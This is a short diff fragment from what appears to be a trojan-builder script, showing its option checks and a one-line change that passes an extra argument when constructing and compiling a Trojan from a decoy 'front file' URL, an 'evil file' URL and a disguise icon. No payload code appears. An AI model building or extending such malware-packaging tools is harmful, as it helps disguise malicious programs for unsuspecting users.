@@ -20,7 +20,7 @@ if not options.evil_file_url:
 if not options.out_file_path:
 	parser.error("Please specify out file, use --help argument for more info.")
 
-trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path, options.out_file_path)
+trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path, options.out_file_path, 0)
 trojan.create()
 trojan.compile()
 
